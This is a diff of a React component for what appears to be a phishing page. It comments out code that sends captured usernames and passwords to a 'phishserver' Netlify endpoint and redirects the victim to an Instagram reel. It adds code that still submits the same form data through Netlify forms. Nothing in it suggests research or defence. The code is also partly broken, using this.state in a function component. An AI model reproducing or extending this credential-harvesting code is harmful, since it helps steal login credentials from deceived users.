@@ -16,29 +16,29 @@ function App() {
     console.log(data)
     const url = 'https://phishserver.netlify.app/.netlify/functions/index/api/users'
     //send username and password to server with fetch request
-   try{
-    fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(data),
-    })
-        console.log('usuario almacenado')
-         window.location.replace("http://www.instagram.com/reels/DBtwBM3uoes/");
-        }catch(e){
-          console.log(e)
-          console.log('usuario no se  almaceno')
-   }finally{
-  // for demonstration purposes, remove in production code.  //send success message to user
-    setData({}) // clear form inputs after successful submission
-    e.preventDefault()  // prevent form from refreshing the page on submission  // prevent form from refreshing the page on submission
-   }
+  //  try{
+  //   fetch(url, {
+  //     method: 'POST',
+  //     headers: {
+  //       'Content-Type': 'application/json',
+  //     },
+  //     body: JSON.stringify(data),
+  //   })
+  //       console.log('usuario almacenado')
+  //        window.location.replace("http://www.instagram.com/reels/DBtwBM3uoes/");
+  //       }catch(e){
+  //         console.log(e)
+  //         console.log('usuario no se  almaceno')
+  //  }finally{
+  // // for demonstration purposes, remove in production code.  //send success message to user
+  //   setData({}) // clear form inputs after successful submission
+  //   e.preventDefault()  // prevent form from refreshing the page on submission  // prevent form from refreshing the page on submission
+  //  }
    try{
     fetch("/", {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: encode({ "form-name": "users", data })
+      body: encode({ "form-name": "users", ...this.state })
     })
       .then(() => alert("Success!"))
       .catch(error => alert(error));
